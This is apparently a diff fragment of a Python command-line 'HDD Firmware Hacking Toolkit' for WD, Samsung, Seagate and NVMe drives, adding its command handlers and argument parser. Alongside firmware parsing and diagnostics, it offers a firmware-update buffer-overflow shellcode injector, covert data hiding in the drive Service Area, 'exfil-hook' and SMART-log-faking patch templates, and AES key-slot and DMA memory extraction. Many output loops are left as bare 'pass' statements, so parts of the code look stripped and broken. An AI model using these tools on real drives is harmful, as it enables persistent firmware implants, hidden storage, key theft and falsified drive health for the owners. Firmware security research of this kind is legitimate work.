+                ok(f"Verified: 0x{addr:08X} = 0x{rb:08X} =")
+            else:
+                err(f"Mismatch: expected 0x{value:08X} got 0x{rb:08X}")
+
+    hdr(f"Parse Firmware: {args.file}")
+    data = Path(args.file).read_bytes()
+    info(f"File size: {len(data)} bytes  ({len(data) / 1024:.1f} KB)")
+
+    if args.format == "wd":
+        sections = WDFirmwareParser().parse(data)
+        for s in sections:
+            pass
+
+        if args.extract:
+            out = Path(args.extract)
+            out.mkdir(exist_ok=True)
+            for s in sections:
+                fname = out / f"section_{s.index:02d}_{s.base_addr:08X}.bin"
+                fname.write_bytes(s.decompressed_data)
+                ok(f"Wrote {fname}")
+
+    elif args.format == "samsung":
+        sections = SamsungFirmwareParser().parse(data)
+        for s in sections:
+            pass
+
+        if args.extract:
+            out = Path(args.extract)
+            out.mkdir(exist_ok=True)
+            for s in sections:
+                fname = out / f"section_{s.index:02d}_{s.base_addr:08X}.bin"
+                fname.write_bytes(s.data)
+                ok(f"Wrote {fname}")
+    else:
+        err(f"Unknown format: {args.format}  (choose: wd, samsung)")
+
+
+def cmd_parse_firmware(args):
+    hdr(f"Parse firmware: {args.file}")
+    data = Path(args.file).read_bytes()
+    if args.format == "wd":
+        parser = WDFirmwareParser(data)
+        ok(
+            f"Magic: {parser.magic.hex()}, Version: {parser.version}, Sections: {len(parser.sections)}"
+        )
+        for sec in parser.sections:
+            pass
+    elif args.format == "samsung":
+        parser = SamsungFirmwareParser()
+        info = parser.parse(data)
+        ok(f"Entries: {info.get('entry_count', 0)}, FTL blobs: {info.get('ftl_count', 0)}")
+        for k, v in info.items():
+            if isinstance(v, (bytes, list)):
+                pass
+            else:
+                pass
+        nibble_swapped = info.get("nibble_swapped", False)
+        if nibble_swapped:
+            warn("Nibble-swapped -- use decode-samsung first")
+    if args.extract:
+        out = Path(args.extract)
+        out.mkdir(exist_ok=True)
+        if args.format == "wd":
+            for i, sec in enumerate(parser.sections):
+                fname = out / f"wd_sec{i:02X}_{sec.load_addr:08X}.bin"
+                fname.write_bytes(parser.section_data(sec))
+                ok(f"Wrote {fname}")
+        else:
+            for i, (k, v) in enumerate(info.items()):
+                if isinstance(v, bytes):
+                    fname = out / f"samsung_{k.replace(' ', '_')}.bin"
+                    fname.write_bytes(v)
+                    ok(f"Wrote {fname}")
+
+
+def cmd_decode_samsung(args):
+    hdr(f"Samsung Deobfuscate: {args.file}")
+    data = Path(args.file).read_bytes()
+    decoded = samsung_decode(data)
+    out = args.output or (args.file + ".decoded")
+    Path(out).write_bytes(decoded)
+    ok(f"Decoded {len(decoded)} bytes -- {out}")
+
+
+def cmd_scan_strings(args):
+    hdr(f"String Scan: {args.file}")
+    data = Path(args.file).read_bytes()
+    strings = scan_strings(data, min_len=args.min_len)
+    for offset, s in strings:
+        pass
+    ok(f"Found {len(strings)} strings")
+
+
+def cmd_scan_fptables(args):
+    hdr(f"Function-Pointer Table Scan: {args.file}")
+    data = Path(args.file).read_bytes()
+    base = int(args.base, 0) if args.base else 0
+    tables = find_arm_function_tables(data, base, args.min_entries)
+    for t in tables:
+        pass
+    ok(f"Found {len(tables)} candidate tables")
+
+
+def cmd_diff(args):
+    hdr(f"Firmware Diff: {args.file_a}  vs  {args.file_b}")
+    a = Path(args.file_a).read_bytes()
+    b = Path(args.file_b).read_bytes()
+    diffs = diff_firmware(a, b)
+    if not diffs:
+        ok("Files are identical")
+        return
+    for offset, old, new in diffs:
+        if old:
+            pass
+        if new:
+            pass
+    ok(
+        f"{len(diffs)} differing region(s), "
+        f"total {sum(max(len(o), len(n)) for o, n in [(d[1], d[2]) for d in diffs])} bytes"
+    )
+
+
+def cmd_list_vscs(args):
+    hdr(f"List VSCs: {args.drive}")
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        vsc.list_vscs()
+
+
+def cmd_read_ram(args):
+    hdr(f"Read RAM: {args.drive}  addr=0x{int(args.addr, 0):08X}  size={args.size}")
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        data = vsc.read_ram(int(args.addr, 0), args.size)
+    if args.output:
+        Path(args.output).write_bytes(data)
+        ok(f"Saved to {args.output}")
+
+
+def cmd_write_ram(args):
+    hdr(f"Write RAM: {args.drive}  addr=0x{int(args.addr, 0):08X}")
+    data = Path(args.file).read_bytes()
+    info(f"Writing {len(data)} bytes=")
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        vsc.write_ram(int(args.addr, 0), data)
+    ok("Write complete")
+
+
+def cmd_hot_patch(args):
+    config = HotPatchConfig(args.config)
+    drive = args.drive or config.drive
+    if not drive:
+        err("No drive specified (pass --drive or set 'drive:' in config)")
+        sys.exit(1)
+    success = deploy_hot_patch(drive, config)
+    sys.exit(0 if success else 1)
+
+
+def cmd_benchmark(args):
+    before_avg = benchmark_reads(args.drive, int(args.sector, 0), args.iterations)
+    if args.patch_config:
+        config = HotPatchConfig(args.patch_config)
+        deploy_hot_patch(args.drive, config)
+        info("\nRe-running benchmark with patch active=")
+        after_avg = benchmark_reads(args.drive, int(args.sector, 0), args.iterations)
+        after_avg - before_avg
+        hdr("Summary")
+
+
+def cmd_dump_overlay(args):
+    hdr(f"Dump Overlay: drive={args.drive}  module=0x{int(args.module, 0):02X}")
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        data = vsc.read_overlay(int(args.module, 0))
+    if not data:
+        warn("Empty response")
+        return
+    out = args.output or f"overlay_{int(args.module, 0):03X}.bin"
+    Path(out).write_bytes(data)
+    ok(f"Wrote {len(data)} bytes -- {out}")
+
+
+def cmd_dump_all_overlays(args):
+    dump_all_overlays(args.drive, args.out_dir, args.max_module)
+
+
+def cmd_jtag_shell(args):
+    with OpenOCDBridge(args.host, args.port) as ocd:
+        ocd.interactive_shell()
+
+
+def cmd_jtag_dump(args):
+    hdr(f"JTAG Memory Dump: 0x{int(args.addr, 0):08X}  size={args.size}")
+    with OpenOCDBridge(args.host, args.port) as ocd:
+        ocd.halt()
+        data = ocd.dump_memory(int(args.addr, 0), args.size)
+        ocd.resume()
+    if data:
+        out = args.output or f"memdump_{int(args.addr, 0):08X}.bin"
+        Path(out).write_bytes(data)
+        ok(f"Wrote {len(data)} bytes -- {out}")
+    else:
+        warn("No data returned - check OpenOCD host for the dump file")
+
+
+def cmd_jtag_bp(args):
+    hdr(f"Set Breakpoint: 0x{int(args.addr, 0):08X}")
+    with OpenOCDBridge(args.host, args.port) as ocd:
+        ocd.set_bp(int(args.addr, 0))
+
+
+def cmd_jtag_regs(args):
+    hdr("Read CPU Registers")
+    with OpenOCDBridge(args.host, args.port) as ocd:
+        ocd.halt()
+        regs = ocd.read_regs()
+        ocd.resume()
+    for name, val in regs.items():
+        pass
+
+
+# == Seagate .lod commands ====================================================
+
+
+def cmd_parse_seagate(args):
+    hdr(f"Parse Seagate .lod: {args.file}")
+    data = Path(args.file).read_bytes()
+    parser = SeagateFWLoader()
+    sections = parser.parse(data)
+    for s in sections:
+        pass
+    if args.extract:
+        out = Path(args.extract)
+        out.mkdir(exist_ok=True)
+        for s in sections:
+            fname = out / f"seagate_sec_{s.id:02X}_{s.load_addr:08X}.bin"
+            fname.write_bytes(s.data)
+            ok(f"Wrote {fname}")
+
+
+# == Service Area commands ====================================================
+
+
+def cmd_sa_probe(args):
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        ServiceArea.probe_sa_size(dev, vsc)
+
+
+def cmd_sa_dump(args):
+    ServiceArea.dump_sa(args.drive, args.out_dir, args.max_module)
+
+
+def cmd_sa_hide(args):
+    data = Path(args.file).read_bytes()
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        ServiceArea.hide_data_in_glist(dev, vsc, data, args.module)
+        ok(f"Hidden {len(data)} bytes in SA module 0x{args.module:02X}")
+
+
+def cmd_sa_extract(args):
+    with ATADevice(args.drive) as dev:
+        vsc = WDVSCClient(dev)
+        data = ServiceArea.extract_hidden_data(dev, vsc, args.module)
+    if data:
+        out = args.output or f"sa_extract_{args.module:02X}.bin"
+        Path(out).write_bytes(data)
+        ok(f"Extracted {len(data)} bytes -- {out}")
+        hexdump(data[:256])
+
+
+# == Firmware update exploit commands =========================================
+
+
+def cmd_fwexploit_send(args):
+    payload = Path(args.payload).read_bytes()
+    with ATADevice(args.drive) as dev:
+        FirmwareUpdateExploit.send_offset_overflow(dev, payload, args.offset, args.subcmd)
+
+
+def cmd_fwexploit_activate(args):
+    with ATADevice(args.drive) as dev:
+        FirmwareUpdateExploit.activate_firmware(dev)
+    ok("Activate sent -- drive may reset or become unresponsive")
+
+
+# == ASM2362 NVMe bridge command ==============================================
+
+
+def cmd_nvme_bridge_sanitize(args):
+    ASM2362NVMeBridge.inject_sanitize(None)
+    ok("Sanitize command structure built (platform-specific TLP injection required)")
+
+
+# == Patch template command ===================================================
+
+
+def cmd_patch_template(args):
+    hdr(f"Patch Template: {args.type}")
+    if args.type == "nop-sled":
+        code = PatchTemplates.build_nop_sled(args.size)
+    elif args.type == "data-trap":
+        if not args.addr:
+            err("--addr required for data-trap")
+            sys.exit(1)
+        repl = Path(args.replacement).read_bytes() if args.replacement else b"\x00" * 4
+        code = PatchTemplates.data_modification_trap(int(args.addr, 0), repl)
+    elif args.type == "exfil-hook":
+        if not args.addr:
+            err("--addr required for exfil-hook")
+            sys.exit(1)
+        signal = args.fake_addr or "0xFFE00000"
+        code = PatchTemplates.exfiltration_hook(int(args.addr, 0), int(signal, 0))
+    elif args.type == "smart-redirect":
+        addr = int(args.addr, 0) if args.addr else 0xBE
+        fake = int(args.fake_addr, 0) if args.fake_addr else None
+        code = PatchTemplates.smart_log_redirect(addr, fake)
+    else:
+        err(f"Unknown template: {args.type}")
+        sys.exit(1)
+
+    Path(args.output).write_bytes(code)
+    ok(f"Wrote {len(code)} bytes -- {args.output}")
+
+
+# =============================================================================
+# Argument parser
+# =============================================================================
+
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(
+        prog="hdd_firmware_toolkit",
+        description="HDD Firmware Hacking Toolkit",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=__doc__,
+    )
+    sub = p.add_subparsers(dest="command", required=True)
+
+    # == Firmware analysis ====================================================
+    sp = sub.add_parser("parse-firmware", help="Parse & extract firmware sections")
+    sp.add_argument("file")
+    sp.add_argument("--format", choices=["wd", "samsung"], default="wd")
+    sp.add_argument("--extract", metavar="DIR", help="Extract sections to directory")
+    sp.set_defaults(func=cmd_parse_firmware)
+
+    sp = sub.add_parser("decode-samsung", help="Remove Samsung nibble-swap obfuscation")
+    sp.add_argument("file")
+    sp.add_argument("-o", "--output")
+    sp.set_defaults(func=cmd_decode_samsung)
+
+    sp = sub.add_parser("scan-strings", help="Find ASCII strings in firmware")
+    sp.add_argument("file")
+    sp.add_argument("--min-len", type=int, default=5)
+    sp.set_defaults(func=cmd_scan_strings)
+
+    sp = sub.add_parser("scan-fptables", help="Heuristic ARM function-pointer table scan")
+    sp.add_argument("file")
+    sp.add_argument("--base", default="0", help="Base load address (hex)")
+    sp.add_argument("--min-entries", type=int, default=4)
+    sp.set_defaults(func=cmd_scan_fptables)
+
+    sp = sub.add_parser("diff", help="Diff two firmware files")
+    sp.add_argument("file_a")
+    sp.add_argument("file_b")
+    sp.set_defaults(func=cmd_diff)
+
+    # == Live drive (ATA) =====================================================
+    def add_drive(p):
+        p.add_argument(
+            "--drive", required=True, help=r"Drive path e.g. \\.\PhysicalDrive1 or /dev/sdb"
+        )
+
+    sp = sub.add_parser("list-vscs", help="Request VSC list from WD drive")
+    add_drive(sp)
+    sp.set_defaults(func=cmd_list_vscs)
+
+    sp = sub.add_parser("read-ram", help="Read drive RAM via WD VSC")
+    add_drive(sp)
+    sp.add_argument("--addr", required=True, help="Address (hex)")
+    sp.add_argument("--size", type=int, default=256)
+    sp.add_argument("-o", "--output")
+    sp.set_defaults(func=cmd_read_ram)
+
+    sp = sub.add_parser("write-ram", help="Write file to drive RAM via WD VSC")
+    add_drive(sp)
+    sp.add_argument("--addr", required=True, help="Address (hex)")
+    sp.add_argument("--file", required=True)
+    sp.set_defaults(func=cmd_write_ram)
+
+    sp = sub.add_parser("hot-patch", help="Assemble + deploy a delay hook to live drive RAM")
+    sp.add_argument("--drive", help="Override drive from config")
+    sp.add_argument("--config", required=True, help="YAML patch config file")
+    sp.set_defaults(func=cmd_hot_patch)
+
+    sp = sub.add_parser("benchmark", help="Timed read benchmark (optional: pre/post patch)")
+    add_drive(sp)
+    sp.add_argument("--sector", default="0x100", help="LBA sector (hex)")
+    sp.add_argument("--iterations", type=int, default=10)
+    sp.add_argument(
+        "--patch-config", metavar="YAML", help="Apply patch between the two benchmark runs"
+    )
+    sp.set_defaults(func=cmd_benchmark)
+
+    sp = sub.add_parser("dump-overlay", help="Dump a single WD service-area overlay module")
+    add_drive(sp)
+    sp.add_argument("--module", required=True, help="Module ID (hex)")
+    sp.add_argument("-o", "--output")
+    sp.set_defaults(func=cmd_dump_overlay)
+
+    sp = sub.add_parser("dump-all-overlays", help="Dump all overlay modules to a directory")
+    add_drive(sp)
+    sp.add_argument("--out-dir", default="overlays")
+    sp.add_argument("--max-module", type=int, default=0x80)
+    sp.set_defaults(func=cmd_dump_all_overlays)
+
+    # == JTAG (OpenOCD) =======================================================
+    def add_ocd(p):
+        p.add_argument("--host", default="localhost")
+        p.add_argument("--port", type=int, default=4444)
+
+    sp = sub.add_parser("jtag-shell", help="Interactive OpenOCD shell")
+    add_ocd(sp)
+    sp.set_defaults(func=cmd_jtag_shell)
+
+    sp = sub.add_parser("jtag-dump", help="Dump memory via JTAG")
+    add_ocd(sp)
+    sp.add_argument("--addr", required=True, help="Address (hex)")
+    sp.add_argument("--size", type=int, default=1024)
+    sp.add_argument("-o", "--output")
+    sp.set_defaults(func=cmd_jtag_dump)
+
+    sp = sub.add_parser("jtag-bp", help="Set a hardware breakpoint via JTAG")
+    add_ocd(sp)
+    sp.add_argument("--addr", required=True, help="Address (hex)")
+    sp.set_defaults(func=cmd_jtag_bp)
+
+    sp = sub.add_parser("jtag-regs", help="Read CPU registers via JTAG")
+    add_ocd(sp)
+    sp.set_defaults(func=cmd_jtag_regs)
+
+    # == Samsung MEX (840 EVO) - reference / static ===========================
+    sp = sub.add_parser(
+        "samsung-memory-map", help="Print Samsung MEX memory map (TheMissingManual)"
+    )
+    sp.set_defaults(func=cmd_samsung_memory_map)
+
+    sp = sub.add_parser(
+        "samsung-fw-history", help="Print Samsung 840 EVO firmware version history"
+    )
+    sp.set_defaults(func=cmd_samsung_fw_history)
+
+    # == Samsung MEX (840 EVO) - JTAG-based commands ==========================
+    sp = sub.add_parser("samsung-gpio", help="Read Samsung MEX GPIO status via JTAG")
+    add_ocd(sp)
+    sp.set_defaults(func=cmd_samsung_gpio)
+
+    sp = sub.add_parser("samsung-ncq", help="Dump Samsung MEX NCQ buffers (0x00800C00) via JTAG")
+    add_ocd(sp)
+    sp.add_argument("-o", "--output", help="Save slot dump to text file")
+    sp.set_defaults(func=cmd_samsung_ncq)
+
+    sp = sub.add_parser(
+        "samsung-aes-info",
+        help="Read AES-XTS key slots / range table via JTAG "
+        "(!! must halt before firmware zeroes them at boot !!)",
+    )
+    add_ocd(sp)
+    sp.set_defaults(func=cmd_samsung_aes_info)
+
+    sp = sub.add_parser(
+        "samsung-dma-dump", help="Copy RAM to SATA window via DMA, then dd-exfiltrate"
+    )
+    add_ocd(sp)
+    sp.add_argument("--addr", required=True, help="Source address (hex)")
+    sp.add_argument(
+        "--size", type=lambda x: int(x, 0), default=0x200, help="Byte count (default 512)"
+    )
+    sp.add_argument("--sata-dev", metavar="DEV", help="Block device for dd, e.g. /dev/sda")
+    sp.add_argument(
+        "--sleep", type=float, default=1.0, help="Seconds to sleep after DMA fire (default 1.0)"
+    )
+    sp.add_argument("-o", "--output", help="Output filename for dd (default auto)")
+    sp.set_defaults(func=cmd_samsung_dma_dump)
+
+    sp = sub.add_parser(
+        "samsung-ftl-preload",
+        help="Pre-load full FTL map by reading one sector per 117.5 MB chunk",
+    )
+    sp.add_argument("--sata-dev", required=True, metavar="DEV", help="Block device, e.g. /dev/sda")
+    sp.add_argument("--size-gb", type=int, default=250, help="SSD capacity in GB (default 250)")
+    sp.add_argument("--host", default="localhost")
+    sp.add_argument("--port", type=int, default=4444)
+    sp.set_defaults(func=cmd_samsung_ftl_preload)
+
+    # == Seagate .lod firmware commands ========================================
+    sp = sub.add_parser("parse-seagate", help="Parse Seagate .lod firmware file")
+    sp.add_argument("file")
+    sp.add_argument("--extract", metavar="DIR", help="Extract sections to directory")
+    sp.set_defaults(func=cmd_parse_seagate)
+
+    # == Service Area commands =================================================
+    def add_drive_wrapped(p):
+        p.add_argument(
+            "--drive", required=True, help=r"Drive path e.g. \\.\PhysicalDrive1 or /dev/sdb"
+        )
+
+    sp = sub.add_parser("sa-probe", help="Probe Service Area size")
+    add_drive_wrapped(sp)
+    sp.set_defaults(func=cmd_sa_probe)
+
+    sp = sub.add_parser("sa-dump", help="Full Service Area dump to directory")
+    add_drive_wrapped(sp)
+    sp.add_argument("--out-dir", default="sa_dump")
+    sp.add_argument("--max-module", type=int, default=0x80)
+    sp.set_defaults(func=cmd_sa_dump)
+
+    sp = sub.add_parser("sa-hide", help="Hide data in SA module (covert storage)")
+    add_drive_wrapped(sp)
+    sp.add_argument("--file", required=True, help="Data file to hide")
+    sp.add_argument(
+        "--module", type=lambda x: int(x, 0), default=0x37, help="Module ID (hex, default 0x37)"
+    )
+    sp.set_defaults(func=cmd_sa_hide)
+
+    sp = sub.add_parser("sa-extract", help="Extract hidden data from SA module")
+    add_drive_wrapped(sp)
+    sp.add_argument(
+        "--module", type=lambda x: int(x, 0), default=0x37, help="Module ID (hex, default 0x37)"
+    )
+    sp.add_argument("-o", "--output", help="Output file")
+    sp.set_defaults(func=cmd_sa_extract)
+
+    # == Firmware update exploit (DOWNLOAD-MICROCODE) ==========================
+    sp = sub.add_parser(
+        "fwexploit-send", help="Inject firmware via DOWNLOAD-MICROCODE offset overflow"
+    )
+    add_drive_wrapped(sp)
+    sp.add_argument("--payload", required=True, help="Shellcode/firmware file")
+    sp.add_argument(
+        "--offset",
+        type=lambda x: int(x, 0),
+        default=0,
+        help="Sector offset (high = buffer overflow)",
+    )
+    sp.add_argument(
+        "--subcmd", type=lambda x: int(x, 0), default=0x03, help="Subcommand: 0x03=DMA, 0x0E=PIO"
+    )
+    sp.set_defaults(func=cmd_fwexploit_send)
+
+    sp = sub.add_parser("fwexploit-activate", help="Activate injected firmware")
+    add_drive_wrapped(sp)
+    sp.set_defaults(func=cmd_fwexploit_activate)
+
+    # == ASM2362 NVMe bridge ==================================================
+    sp = sub.add_parser(
+        "nvme-bridge-sanitize", help="Inject Sanitize Block Erase via ASM2362 XRAM"
+    )
+    sp.set_defaults(func=cmd_nvme_bridge_sanitize)
+
+    # == Patch templates =======================================================
+    sp = sub.add_parser("patch-template", help="Generate pre-built patch shellcode")
+    sp.add_argument(
+        "type",
+        choices=["nop-sled", "data-trap", "exfil-hook", "smart-redirect"],
+        help="Patch template type",
+    )
+    sp.add_argument("--addr", help="Target address (hex)")
+    sp.add_argument("--fake-addr", help="Fake data address for smart-redirect")
+    sp.add_argument("--replacement", help="Replacement data file for data-trap")
+    sp.add_argument("--size", type=int, default=64, help="Size for nop-sled")
+    sp.add_argument("-o", "--output", default="patch.bin", help="Output file")
+    sp.set_defaults(func=cmd_patch_template)
+
+    # == Toshiba firmware commands ==============================================
+    sp = sub.add_parser("toshiba-parse", help="Parse Toshiba firmware image")
+    sp.add_argument("file")
+    sp.set_defaults(func=cmd_toshiba_parse)
+
+    sp = sub.add_parser("toshiba-nand", help="Show Toshiba NAND configuration")
+    sp.add_argument("file")
+    sp.set_defaults(func=cmd_toshiba_nand)
+
+    # == SAT layer commands ====================================================
+    sp = sub.add_parser("sat-cdb", help="Build SCSI-ATA Translation CDB")
+    sp.add_argument("ata_cmd", type=lambda x: int(x, 0), help="ATA command (hex)")
+    sp.add_argument("--lba", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--count", type=int, default=1)
+    sp.add_argument(
+        "--protocol",
+        type=int,
+        default=4,
+        help="4=PIO_IN, 5=PIO_OUT, 6=DMA, 10=UDMA_IN, 13=NO_DATA",
+    )
+    sp.add_argument("--cdb-size", choices=["12", "16", "32"], default="16")
+    sp.set_defaults(func=cmd_sat_build_cdb)
+
+    # == Firmware patcher commands =============================================
+    sp = sub.add_parser("patcher-apply", help="Apply patches and fix checksums")
+    sp.add_argument("file", help="Original firmware image")
+    sp.add_argument("patches", nargs="+", help="Patch JSON file(s)")
+    sp.add_argument("-o", "--output", default="patched.bin")
+    sp.set_defaults(func=cmd_patcher_apply)
+
+    sp = sub.add_parser("patcher-fix", help="Auto-fix firmware checksums")
+    sp.add_argument("file")
+    sp.add_argument("-o", "--output")
+    sp.set_defaults(func=cmd_patcher_fix)
+
+    # == ATA security commands =================================================
+    sp = sub.add_parser("ata-sec-status", help="Check ATA security status")
+    sp.set_defaults(func=cmd_ata_sec_status)
+
+    # == NVMe admin commands ==================================================
+    sp = sub.add_parser("nvme-identify", help="NVMe Identify Controller")
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.set_defaults(func=cmd_nvme_identify)
+
+    sp = sub.add_parser("nvme-smart", help="NVMe SMART / Health log")
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.set_defaults(func=cmd_nvme_smart)
+
+    sp = sub.add_parser("nvme-fw-download", help="NVMe firmware download")
+    sp.add_argument("file")
+    sp.add_argument(
+        "--offset", type=lambda x: int(x, 0), default=0, help="Download offset (dwords)"
+    )
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.set_defaults(func=cmd_nvme_fw_dl)
+
+    sp = sub.add_parser("nvme-fw-activate", help="NVMe firmware activate")
+    sp.add_argument("--slot", type=int, default=1, help="Firmware slot (1-7)")
+    sp.add_argument(
+        "--action", type=int, default=3, help="1=replace, 2=replace+enable, 3=replace+enable+reset"
+    )
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.set_defaults(func=cmd_nvme_fw_activate)
+
+    sp = sub.add_parser("nvme-vendor", help="NVMe vendor-specific admin command")
+    sp.add_argument("opcode", type=lambda x: int(x, 0), help="Admin opcode (hex)")
+    sp.add_argument("--cdw10", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--cdw11", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--data-len", type=int, default=0)
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.set_defaults(func=cmd_nvme_vendor)
+
+    # == NVMe live device commands =============================================
+    sp = sub.add_parser(
+        "nvme-live-identify", help="Read Identify Controller data from live NVMe device"
+    )
+    sp.add_argument("device", type=str, help="NVMe device number (e.g. 0) or path")
+    sp.add_argument("--hex", action="store_true", help="Show hex dump of data")
+    sp.set_defaults(func=cmd_nvme_live_identify)
+
+    sp = sub.add_parser("nvme-live-smart", help="Read SMART/Health log from live NVMe device")
+    sp.add_argument("device", type=str, help="NVMe device number (e.g. 0) or path")
+    sp.add_argument("--hex", action="store_true", help="Show hex dump of data")
+    sp.set_defaults(func=cmd_nvme_live_smart)
+
+    sp = sub.add_parser("nvme-live-get-log", help="Read arbitrary log page from live NVMe device")
+    sp.add_argument("log_id", type=lambda x: int(x, 0), help="Log page ID (hex, e.g. 0xC0)")
+    sp.add_argument("--device", type=str, default="0", help="NVMe device number or path")
+    sp.add_argument("--size", help="Log page size (hex, default 512)")
+    sp.set_defaults(func=cmd_nvme_live_get_log)
+
+    sp = sub.add_parser(
+        "nvme-live-fw-log", help="Read Firmware Slot Information log from live NVMe device"
+    )
+    sp.add_argument("device", type=str, help="NVMe device number (e.g. 0) or path")
+    sp.set_defaults(func=cmd_nvme_live_fw_log)
+
+    sp = sub.add_parser("nvme-live-send", help="Send arbitrary NVMe admin command to live device")
+    sp.add_argument("opcode", type=lambda x: int(x, 0), help="Admin opcode (hex)")
+    sp.add_argument("--device", type=str, default="0", help="NVMe device number or path")
+    sp.add_argument("--cdw10", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--cdw11", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--cdw12", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--cdw13", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--nsid", type=lambda x: int(x, 0), default=0)
+    sp.add_argument("--file", help="File to write (for write commands)")
+    sp.set_defaults(func=cmd_nvme_live_send)
+
+    sp = sub.add_parser(
+        "sandisk-live-sniff",
+        help="Detect SanDisk/WD NVMe drive and probe vendor log pages on live device",
+    )
+    sp.add_argument("device", type=str, help="NVMe device number (e.g. 0) or path")
+    sp.set_defaults(func=cmd_sandisk_live_sniff)
+
+    # == SanDisk/WD NVMe vendor-specific commands ==============================
+    sp = sub.add_parser("sandisk-id", help="SanDisk/WD NVMe vendor info (VID/DID/family)")
+    sp.set_defaults(func=cmd_sandisk_id)
+
+    sp = sub.add_parser(
+        "sandisk-sniff-logs",
+        help="Detect which vendor log pages a SanDisk/WD drive likely supports",
+    )
+    sp.set_defaults(func=cmd_sandisk_sniff_logs)
+
+    sp = sub.add_parser(
+        "sandisk-build-log", help="Build GET LOG PAGE command for a SanDisk/WD vendor log"
+    )
+    sp.add_argument("--log-id", required=True, help="Log page ID (hex, e.g. 0xC0)")
+    sp.add_argument("--size", help="Log page size (hex, default 512)")
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.add_argument("--dump", action="store_true", help="Dump parsed log data")
+    sp.set_defaults(func=cmd_sandisk_build_log)
+
+    sp = sub.add_parser("sandisk-build-vu", help="Build SanDisk/WD vendor-specific admin command")
+    sp.add_argument("opcode", type=lambda x: int(x, 0), help="Admin opcode (hex)")
+    sp.add_argument("--cdw10", help="CDW10 value (hex)")
+    sp.add_argument("--cdw11", help="CDW11 value (hex)")
+    sp.add_argument("--device", default="0", help="NVMe device number")
+    sp.set_defaults(func=cmd_sandisk_build_vu)
+
+    sp = sub.add_parser("sandisk-build-purge", help="Build SanDisk/WD Purge command (opcode 0xDD)")
+    sp.set_defaults(func=cmd_sandisk_build_purge)
+
+    sp = sub.add_parser(
+        "sandisk-build-resize", help="Build SanDisk/WD Drive Resize command (opcode 0xCC)"
+    )
+    sp.add_argument("--size", required=True, help="New size in sectors")
+    sp.set_defaults(func=cmd_sandisk_build_resize)
+
+    sp = sub.add_parser("sandisk-parse-c0", help="Parse SanDisk/WD 0xC0 EOL Status log page")
+    sp.add_argument("file", help="Raw log page dump (512 bytes)")
+    sp.set_defaults(func=cmd_sandisk_parse_c0)
+
+    sp = sub.add_parser(
+        "sandisk-parse-ca", help="Parse SanDisk/WD 0xCA Device Info / Performance log page"
+    )
+    sp.add_argument("file", help="Raw log page dump (160+ bytes)")
+    sp.set_defaults(func=cmd_sandisk_parse_ca)
+
+    sp = sub.add_parser("sandisk-parse-d0", help="Parse SanDisk/WD 0xD0 VU SMART log page")
+    sp.add_argument("file", help="Raw log page dump (512 bytes)")
+    sp.set_defaults(func=cmd_sandisk_parse_d0)
+
+    # == USB bridge commands ==================================================
+    sp = sub.add_parser("usb-identify", help="Identify USB-SATA bridge chip")
+    sp.add_argument("--vid", type=lambda x: int(x, 0), help="USB vendor ID (hex)")
+    sp.add_argument("--pid", type=lambda x: int(x, 0), help="USB product ID (hex)")
+    sp.add_argument("--inquiry", help="SCSI INQUIRY vendor string")
+    sp.set_defaults(func=cmd_usb_identify)
+
+    sp = sub.add_parser("usb-list", help="List known USB-SATA bridge chips")
+    sp.set_defaults(func=cmd_usb_list)
+
+    # == Data recovery commands ================================================
+    sp = sub.add_parser("dr-smart", help="SMART quick test (data recovery)")
+    sp.add_argument("--drive", required=True, help="Drive path")
+    sp.set_defaults(func=cmd_dr_smart)
+
+    sp = sub.add_parser("dr-identify", help="Identify device parameters for recovery")
+    sp.add_argument("--drive", required=True, help="Drive path")
+    sp.set_defaults(func=cmd_dr_identify)
+
+    sp = sub.add_parser("dr-native-max", help="Read Native Max Address")
+    sp.add_argument("--drive", required=True, help="Drive path")
+    sp.set_defaults(func=cmd_dr_native_max)
+
+    sp = sub.add_parser("dr-pattern", help="Generate defective sector test pattern")
+    sp.add_argument("--lba", type=lambda x: int(x, 0), default=0x1000)
+    sp.add_argument("--size", type=int, default=512, help="Sector size")
+    sp.add_argument("-o", "--output", default="defective_sector.bin")
+    sp.set_defaults(func=cmd_dr_pattern)
+
+    # == HPA/DCO commands =====================================================
+    sp = sub.add_parser("hpa-detect", help="Detect HPA from IDENTIFY DEVICE data")
+    sp.add_argument("--file", help="IDENTIFY DEVICE dump binary")
+    sp.set_defaults(func=cmd_hpa_detect)
+
+    sp = sub.add_parser("hpa-build-cmd", help="Build HPA/DCO ATA command CDB")
+    sp.add_argument(
+        "type", choices=["read-native", "set-max", "dco-identify", "dco-set", "dco-restore"]
+    )
+    sp.add_argument("--lba", type=lambda x: int(x, 0), default=0, help="LBA for SET MAX")
+    sp.add_argument("--lba48", action="store_true", default=True, help="Use 48-bit LBA")
+    sp.add_argument("--persistent", action="store_true", default=False, help="Persistent SET MAX")
+    sp.add_argument("--dco-file", help="DCO data file for SET")
+    sp.set_defaults(func=cmd_hpa_build_cmd)
+
+    sp = sub.add_parser("hpa-parse-dco", help="Parse DCO feature set descriptor")
+    sp.add_argument("file", help="DCO IDENTIFY data binary (512 bytes)")
+    sp.set_defaults(func=cmd_hpa_parse_dco)
+
+    # == NVMe timing side-channel commands =====================================
+    sp = sub.add_parser("nvme-timing-baseline", help="NVMe read latency baseline estimation")
+    sp.set_defaults(func=cmd_nvme_timing_baseline)
+
